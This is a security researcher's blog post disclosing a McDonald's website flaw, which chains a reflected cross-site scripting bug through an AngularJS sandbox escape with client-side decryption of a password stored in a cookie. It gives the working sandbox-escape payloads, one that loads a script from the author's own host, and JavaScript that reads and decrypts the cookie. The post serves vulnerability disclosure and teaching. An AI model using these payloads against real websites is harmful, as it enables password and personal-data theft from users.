<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="/css/template.css?version=2.0.1" /><link rel="shortcut icon" href="/img/favicon.svg?version=2.0.1" type="image/svg+xml" /> <script src="/js/template.js?version=2.0.1"></script><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: light)" /><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: dark)" /><title>Stealing passwords from McDonald's users</title><meta property="og:title" content="Stealing passwords from McDonald's users"><meta name="description" itemprop="description" content="By abusing an insecure cryptographic storage vulnerability and a reflected server cross-site-scripting vulnerability it is possible to steal and decrypt the password from a McDonald's user."><meta property="og:description" content="By abusing an insecure cryptographic storage vulnerability and a reflected server cross-site-scripting vulnerability it is possible to steal and decrypt the password from a McDonald's user."><meta name="keywords" content="xss, cross-site, scripting, mcdonalds, password, vulnerability, stealing, angularjs"><meta name="language" content="english"><meta name="author" itemprop="creator" content="Tijme Gommers"><meta name="robots" content="index, follow"><meta name="distribution" content="global"><meta name="copyright" content="Copyright © 2024 Tijme Gommers. All rights reserved."><link rel="alternate" type="application/rss+xml" title="Atom" href="/feeds/atom.xml"></head><body><div class="navbar-wrapper mb-4"><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><nav class="navbar navbar-expand"><div class="collapse navbar-collapse"><ul class="navbar-nav me-auto"><li class="nav-item"> <a href="/" target="_self" class="nav-link"> <span>Posts</span> </a></li><li class="nav-item"> <a href="/about/" target="_self" class="nav-link"> <span>About</span> </a></li><li class="nav-item"> <a href="/donate/" target="_self" class="nav-link"> <span>Donate</span> </a></li></ul><ul class="navbar-nav"><li class="nav-item"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://www.linkedin.com/in/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://github.com/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="/feeds/atom.xml" target="_blank" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#rss"/></svg> </span></span> </a></li></ul></div></nav></div></div></div></div><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><article class="container-fluid"><h1 class="mb-2">Stealing passwords from McDonald's users</h1><p class="mb-2 text-muted">Posted on <time datetime="2017-01-06T00:00:00+00:00">6 January 2017</time> by Tijme Gommers.</p><p>By abusing an insecure <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" target="_blank" rel="noopener noreferrer">cryptographic storage vulnerability</a> and a <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener noreferrer">reflected server cross-site-scripting vulnerability</a> it is possible to steal and decrypt the password from a McDonald’s user. Besides that, other personal details like the user’s name, address &amp; contact details can be stolen too.</p><h3 id="proof-of-concept">Proof of Concept</h3><h4 id="reflected-xss-through-angularjs-sandbox-escape">Reflected XSS through AngularJS sandbox escape</h4><p>McDonalds.com contains a search page which reflects the value of the search parameter (<code class="language-plaintext highlighter-rouge">q</code>) in the source of the page. So when we search on for example <code class="language-plaintext highlighter-rouge">***********-test-reflected-test-***********</code>, the response will look like this:</p><div class="row mb-2"><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/search-value-test-preview.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-1" data-title="Text on website"><img src="/img/stealing-passwords-from-mcdonalds-users/search-value-test-preview.png" title="Text on website" alt="Text on website" /></a></div><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/search-value-test-reflected.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-1" data-title="Text in HTML"><img src="/img/stealing-passwords-from-mcdonalds-users/search-value-test-reflected.png" title="Text in HTML" alt="Text in HTML" /></a></div></div><p>McDonald’s uses AngularJS so we can try to print the unique scope ID using the search value. We can do this by changing the <code class="language-plaintext highlighter-rouge">q</code> parameter value to <code class="language-plaintext highlighter-rouge">{{$id}}</code>. As we can see <code class="language-plaintext highlighter-rouge">{{$id}}</code> gets converted to <code class="language-plaintext highlighter-rouge">9</code> the unique ID (monotonically increasing) of the AngularJS scope.</p><div class="row mb-2"><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-preview.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-2" data-title="Unique ID on website"><img src="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-preview.png" title="Unique ID on website" alt="Unique ID on website" /></a></div><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-reflected.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-2" data-title="Unique ID in HTML"><img src="/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-reflected.png" title="Unique ID in HTML" alt="Unique ID in HTML" /></a></div></div><p>Using <code class="language-plaintext highlighter-rouge">{{alert(1)}}</code> as value wouldn’t work because all AngularJS code is executed in a sandbox. However, the AngularJS sandbox isn’t really safe. In fact, it shouldn’t be trusted at all. It even <a href="https://docs.angularjs.org/guide/security#sandbox-removal" target="_blank" rel="noopener noreferrer">got removed</a> in version 1.6 because it gave a false sense of security. PortSwigger created a nice blog post about <a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank" rel="noopener noreferrer">escaping the AngularJS sandbox</a>.</p><p>We first need to find the AngularJS version of McDonalds.com. We can do this by executing <code class="language-plaintext highlighter-rouge">angular.version</code> in the console.</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/angular-version.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-3" data-title="Angular version"><img src="/img/stealing-passwords-from-mcdonalds-users/angular-version.png" title="Angular version" alt="Angular version" /></a></div></div><p>The version is 1.5.3, so the sandbox escape we need is <code class="language-plaintext highlighter-rouge">{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}</code>. We can use this sandbox escape as search value, which results in an alert.</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/alert-1-in-chrome.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-4" data-title="Alert using AngularJS sandbox escape"><img src="/img/stealing-passwords-from-mcdonalds-users/alert-1-in-chrome.png" title="Alert using AngularJS sandbox escape" alt="Alert using AngularJS sandbox escape" /></a></div></div><p>We can even load external JavaScript files using the following sandbox escape, which results in the alert below.</p><p><code class="language-plaintext highlighter-rouge">{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(</code>https://tij.me/snippets/external-alert.js<code class="language-plaintext highlighter-rouge">)');}}</code></p><p>The JavaScript can be loaded from another domain since McDonald’s doesn’t exclude it using the <code class="language-plaintext highlighter-rouge">Content-Security-Policy</code> header.</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/alert-external-in-chrome.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-5" data-title="External domain alert using AngularJS sandbox escape"><img src="/img/stealing-passwords-from-mcdonalds-users/alert-external-in-chrome.png" title="External domain alert using AngularJS sandbox escape" alt="External domain alert using AngularJS sandbox escape" /></a></div></div><h3 id="proof-of-concept-1">Proof of Concept</h3><h4 id="stealing-the-users-password">Stealing the user’s password</h4><p>Another thing I noticed on McDonalds.com was their sign in page which contained a very special checkbox. Normally you can check “Remember me” when signing in, but the McDonald’s sign in page gives us the option to remember the password.</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/mcdonalds-login-form.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-6" data-title="Remember my password checkbox"><img src="/img/stealing-passwords-from-mcdonalds-users/mcdonalds-login-form.png" title="Remember my password checkbox" alt="Remember my password checkbox" /></a></div></div><p>I searched through all the JavaScript for the keyword <code class="language-plaintext highlighter-rouge">password</code> and I found some interesting code that decrypts the password.</p><div class="row mb-2"><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/source-search-password.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-7" data-title="Source code search for `password`"><img src="/img/stealing-passwords-from-mcdonalds-users/source-search-password.png" title="Source code search for `password`" alt="Source code search for `password`" /></a></div><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/cookie-pass-decrypt-source.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-7" data-title="Source for decrypting the user's password"><img src="/img/stealing-passwords-from-mcdonalds-users/cookie-pass-decrypt-source.png" title="Source for decrypting the user's password" alt="Source for decrypting the user's password" /></a></div></div><p>If there’s one thing you shouldn’t do, it’s decrypting passwords client side (or even storing passwords using two-way encryption). I tried to run the code myself, and it worked!</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/decrypt-get-cookie-penc.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-8" data-title="Decrypting my password using the console"><img src="/img/stealing-passwords-from-mcdonalds-users/decrypt-get-cookie-penc.png" title="Decrypting my password using the console" alt="Decrypting my password using the console" /></a></div></div><p>The <code class="language-plaintext highlighter-rouge">penc</code> value is a cookie that is stored for a year. LOL!</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/penc-cookie.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-9" data-title="The `penc` cookie that is stored for a year"><img src="/img/stealing-passwords-from-mcdonalds-users/penc-cookie.png" title="The `penc` cookie that is stored for a year" alt="The `penc` cookie that is stored for a year" /></a></div></div><p>McDonald’s uses CryptoJS to encrypt and decrypt sensitive data. They use the same <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">iv</code> for every user, which means I only have to steal the <code class="language-plaintext highlighter-rouge">penc</code> cookie to decrypt someone’s password.</p><div class="row mb-2"><div class="col-md-12"> <a href="/img/stealing-passwords-from-mcdonalds-users/encrypt-decrypt-source.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-10" data-title="Encrypting and decrypting sensitive data using CryptoJS"><img src="/img/stealing-passwords-from-mcdonalds-users/encrypt-decrypt-source.png" title="Encrypting and decrypting sensitive data using CryptoJS" alt="Encrypting and decrypting sensitive data using CryptoJS" /></a></div></div><p>I tried decrypting my password on the search page using a malicious search payload, but it didn’t work. Since the AngularJS sandbox escape payload replaces the <code class="language-plaintext highlighter-rouge">charAt</code> method with the <code class="language-plaintext highlighter-rouge">join</code> method, the <code class="language-plaintext highlighter-rouge">getCookie</code> method failed. The <code class="language-plaintext highlighter-rouge">getCookie</code> method tries to trim whitespaces from cookie values by checking if <code class="language-plaintext highlighter-rouge">charAt(0)</code> is a whitespace. In the images below you can see <code class="language-plaintext highlighter-rouge">.charAt(0)</code> returns a string joined by <code class="language-plaintext highlighter-rouge">0</code> if executed on the search page.</p><div class="row mb-2"><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/char-at-fail.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-11" data-title="The `charAt` method on the search page (fails)"><img src="/img/stealing-passwords-from-mcdonalds-users/char-at-fail.png" title="The `charAt` method on the search page (fails)" alt="The `charAt` method on the search page (fails)" /></a></div><div class="col-md-6"> <a href="/img/stealing-passwords-from-mcdonalds-users/char-at-success.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-11" data-title="The `charAt` method on the homepage (success)"><img src="/img/stealing-passwords-from-mcdonalds-users/char-at-success.png" title="The `charAt` method on the homepage (success)" alt="The `charAt` method on the homepage (success)" /></a></div></div><p>I wrote some JavaScript that loads the homepage in an iframe and steals the cookie using that iframe. Since the payload is executed multiple times because of the sandbox escape, I keep track of the variable <code class="language-plaintext highlighter-rouge">xssIsExecuted</code>, so that the payload is only executed once.</p><figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">xssIsExecuted</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">xssIsExecuted</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

    <span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;iframe src="https://www.mcdonalds.com/us/en-us.html"&gt;&lt;/iframe&gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">body</span><span class="dl">'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>

    <span class="nx">iframe</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">penc</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">getCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">penc</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">alert</span><span class="p">(</span><span class="nx">iframe</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">penc</span><span class="p">));</span>
    <span class="p">});</span>
<span class="p">}</span></code></pre></figure><p>We can now use the following sandbox escape, which results in my password in an alert box!</p><p><code class="language-plaintext highlighter-rouge">{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(</code>https://tij.me/snippets/mcdonalds-password-stealer.js<code class="language-plaintext highlighter-rouge">)');}}</code></p><p><a href="/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png" target="_blank" rel="noopener noreferrer" data-lightbox="step-12" data-title="My password!"><img src="/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png" alt="My password!" /></a></p><p>That was all pretty easy. I tried to contact McDonald’s multiple times to report the issue, but unfortunately they didn’t respond, which is why I decided to disclose the vulnerability.</p></article><footer class="text-center mt-5 mb-5"><div class="footer-links"> <a href="/"><span>Posts</span></a> <a href="/about/" target="_self"><span>About</span></a> <a href="/donate/" target="_self"><span>Donate</span></a> <a href="/responsible-disclosure/" target="_self"><span>Responsible Disclosure</span></a></div><p class="footer-copyright text-secondary"> Copyright &copy; 2024 Tijme Gommers. All rights reserved.</p><div class="footer-icons"><div class="padding"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></div><div class="padding"> <a href="https://github.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></div><div class="padding"> <a href="https://www.linkedin.com/in/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></div></div></footer></div></div></div></body></html>
